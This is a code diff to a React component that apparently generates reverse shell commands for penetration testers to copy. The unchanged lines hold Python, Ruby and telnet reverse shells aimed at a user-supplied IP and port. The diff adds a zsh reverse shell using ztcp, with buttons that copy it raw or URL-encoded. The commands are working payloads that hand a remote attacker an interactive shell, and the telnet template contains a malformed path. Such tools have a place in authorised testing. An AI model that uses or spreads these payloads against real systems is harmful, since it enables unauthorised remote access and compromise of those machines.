@@ -33,6 +33,7 @@ export default (props) => {
 	const python_rshell = `python -c 'import sys,socket,os,pty;s=socket.socket()s.connect((os.getenv("${values.ip}"),int(os.getenv("${values.port}"))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn("/bin/sh")'`;
 	const ruby_rshell = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["${values.ip}"],ENV["${values.port}"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
 	const telnet_rshell = `TF=$(mktemp -u); mkfifo $TF && telnet ${values.ip} ${values.port} 0<$TF | /bin sh 1>$TF`;
+	const zsh_rshell = `zsh -c 'zmodload zsh/net/tcp && ztcp ${values.ip} ${values.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`
 
 	return (
 		<QueueAnim delay={300} duration={1500}>
@@ -85,6 +86,33 @@ export default (props) => {
 					</Button>
 				</Clipboard>
 				<Clipboard component='a' data-clipboard-text={encodeURI(bash_rshell)}>
+					<Button
+						type='dashed'
+						onClick={successInfoEncodeURL}
+						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+					>
+						<LinkOutlined /> URL encoded
+					</Button>
+				</Clipboard>
+			</div>
+			<Divider dashed />
+			<div style={{ padding: 10, marginTop: 15 }} key='a'>
+				<Title level={3}>
+					Zsh <IconFont type='icon-command-line' />
+				</Title>
+				<Paragraph copyable editable ellipsis={true}>
+					{zsh_rshell}
+				</Paragraph>
+				<Clipboard component='a' data-clipboard-text={zsh_rshell}>
+					<Button
+						type='primary'
+						onClick={successInfoReverseShell}
+						style={{ marginBottom: 10, marginTop: 15 }}
+					>
+						<CopyOutlined /> Copy the reverse shell
+					</Button>
+				</Clipboard>
+				<Clipboard component='a' data-clipboard-text={encodeURI(zsh_rshell)}>
 					<Button
 						type='dashed'
 						onClick={successInfoEncodeURL}
